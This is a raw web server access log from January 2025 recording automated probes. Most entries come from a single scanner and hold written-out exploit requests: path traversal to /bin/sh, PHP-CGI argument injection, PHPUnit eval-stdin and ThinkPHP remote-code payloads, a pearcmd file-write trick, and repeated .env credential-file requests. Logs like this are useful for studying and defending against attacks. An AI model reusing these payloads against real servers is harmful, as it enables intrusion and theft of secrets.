130.61.239.224 - - [16/Jan/2025:21:13:39 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:41 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:42 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:42 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:43 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:44 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:45 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:46 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:46 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:47 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:48 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:48 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:49 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:49 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:50 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:50 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:51 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:52 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:52 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:53 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:54 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:54 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:55 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:55 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:56 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:56 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:57 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:57 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:58 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:59 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:13:59 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:00 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:00 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:01 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:02 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:02 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:03 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:03 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:04 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:05 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:05 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:06 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:07 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.224 - - [16/Jan/2025:21:14:07 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
179.43.191.146 - - [16/Jan/2025:21:21:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.143 - - [16/Jan/2025:21:30:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
198.235.24.237 - - [16/Jan/2025:21:31:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
46.19.138.234 - - [16/Jan/2025:22:08:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
142.93.221.56 - - [16/Jan/2025:22:15:59 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0"
78.153.140.93 - - [16/Jan/2025:22:26:44 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:22:26:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
103.207.125.222 - - [16/Jan/2025:22:41:09 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 302 387 "-" "Hello, World"
78.153.140.93 - - [16/Jan/2025:23:13:33 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [16/Jan/2025:23:13:34 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.242.226.10 - - [16/Jan/2025:23:20:43 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
87.120.115.119 - - [16/Jan/2025:23:34:39 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; CLT-AL00 Build/HUAWEICLT-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044807 Mobile Safari/537.36 MMWEBID/9069 MicroMessenger/7.0.6.1460(0x27000634) Process/tools NetType/WIFI Language/zh_CN"
172.105.128.12 - - [16/Jan/2025:23:52:17 +0000] "\x16\x03\x01" 400 526 "-" "-"
